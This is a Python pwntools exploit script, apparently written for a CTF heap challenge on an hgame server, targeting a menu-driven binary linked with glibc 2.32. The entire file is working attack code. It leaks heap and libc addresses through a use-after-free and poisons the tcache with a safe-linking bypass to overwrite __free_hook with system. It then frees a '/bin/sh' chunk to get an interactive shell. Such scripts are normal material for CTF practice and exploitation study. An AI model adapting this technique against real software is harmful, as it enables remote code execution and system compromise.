from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["week-3.hgame.lwsec.cn",30270]
libc=ELF('./libc-2.32.so')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process('./vuln_patched')
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(index, size):
    ru(b'>')
    sl(b'1')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Size: ')
    sl(str(size))

def delete(index):
    ru(b'>')
    sl(b'2')
    ru(b'Index: ')
    sl(str(index))

def edit(index, content):
    ru(b'>')
    sl(b'3')
    ru(b'Index: ')
    sl(str(index))
    ru(b'Content: ')
    s(content)

def show(index):
    ru(b'>')
    sl(b'4')
    ru(b'Index: ')
    sl(str(index))

#gdb.attach(p, '''
#  b *$rebase(0x13de)
#   b *$rebase(0x14d3)
#''')

for i in range(9):
    add(i, 0x80)

delete(0)
show(0)
leak_addr = u64(rc(5).ljust(8, b'\x00'))
heap_base = leak_addr << 12
pr('heap_base', heap_base)

for i in range(1,8):
    delete(i)
edit(7, b'\xa0')
show(7)

leak_addr = u64(rc(6).ljust(8, b'\x00'))
pr('leak_addr', leak_addr)
libc_base = leak_addr - 0x1e3ca0
pr('libc_base', libc_base)

free_hook = libc_base + libc.sym['__free_hook']
sys_addr = libc_base + libc.sym['system']

edit(8, b'/bin/sh\x00')
add(9, 0x80)
delete(6)

payload = p64((heap_base >> 12) ^ free_hook)
edit(9, payload + b'\x0a')
add(10, 0x80)
add(11, 0x80)
edit(11, p64(sys_addr))

delete(8)



shell()
